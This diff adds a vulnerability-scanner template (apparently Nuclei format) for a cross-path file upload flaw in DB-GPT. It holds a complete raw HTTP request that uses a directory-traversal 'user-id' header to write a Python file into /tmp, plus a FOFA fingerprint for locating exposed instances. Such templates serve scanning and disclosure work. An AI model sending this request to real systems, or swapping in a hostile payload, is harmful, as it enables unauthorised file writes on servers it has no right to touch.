@@ -1,0 +1,37 @@
+id: poc-bqdz8x9a6pd0ik5m
+info:
+  name: DB-GPT upload存在跨路径文件写入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bqdz8x9a6pd0ik5m'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bqdz8x9a6pd0ik5m
+    fofa: icon_hash="100632689"
+http:
+- raw:
+  - 'POST /api/v1/python/file/upload HTTP/1.1
+
+    Host: {{Hostname}}
+
+    user-id: ../../../../../../../../../../tmp
+
+    Content-Type: multipart/form-data; boundary=----Boundary1752894263714
+
+
+    ------Boundary1752894263714
+
+    Content-Disposition: form-data; name="file"; filename="33223.py"
+
+    Content-Type: text/x-python
+
+
+    print("33223")
+
+    ------Boundary1752894263714--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
